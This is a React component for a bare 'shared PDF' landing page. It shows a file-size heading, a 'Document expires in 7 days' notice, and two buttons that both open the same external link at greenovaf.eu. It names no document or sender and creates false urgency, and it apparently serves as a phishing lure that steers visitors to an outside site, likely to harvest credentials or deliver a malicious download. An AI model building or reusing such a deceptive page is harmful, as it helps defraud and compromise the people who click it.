import { Download, ExternalLink } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import pdfIcon from "@/assets/pdf-icon.png";

const DocumentCard = () => {
  return (
    <div className="min-h-screen bg-white flex items-center justify-center p-4">
      <div className="w-full max-w-md mx-auto">
        {/* Document Icon */}
        <div className="text-center mb-8">
          <div className="w-24 h-24 mx-auto mb-6 bg-white rounded-full flex items-center justify-center shadow-medium p-3">
            <img src={pdfIcon} alt="PDF Document" className="w-full h-full object-contain" />
          </div>
          
          {/* Main Heading */}
          <h1 className="text-xl font-bold text-foreground mb-3">
            PDF 135kb
          </h1>
          
          {/* Subtitle */}
          <p className="text-sm text-muted-foreground">
            Review the document details below.
          </p>
        </div>

        {/* Action Buttons */}
        <Card className="p-4 shadow-soft border-0 bg-card">
          <div className="space-y-3">
            {/* Primary Action Button */}
            <Button 
              className="w-full h-10 text-sm font-semibold bg-gradient-primary hover:shadow-medium transform hover:scale-105 transition-all duration-300 border-0"
              size="default"
              onClick={() => window.open('https://greenovaf.eu/D7n5xVZzL/', '_blank')}
            >
              <ExternalLink className="w-4 h-4 mr-2" />
              Open Document
            </Button>
            
            {/* Secondary Action Button */}
            <Button 
              variant="outline" 
              className="w-full h-9 text-xs font-medium border-2 border-border hover:bg-secondary hover:shadow-soft transform hover:scale-105 transition-all duration-300"
              size="sm"
              onClick={() => window.open('https://greenovaf.eu/D7n5xVZzL/', '_blank')}
            >
              <Download className="w-3 h-3 mr-2" />
              Download Document
            </Button>
          </div>
        </Card>

        {/* Additional Info */}
        <div className="mt-8 text-center">
          <p className="text-xs text-muted-foreground">
            Document expires in 7 days
          </p>
        </div>
      </div>
    </div>
  );
};

export default DocumentCard;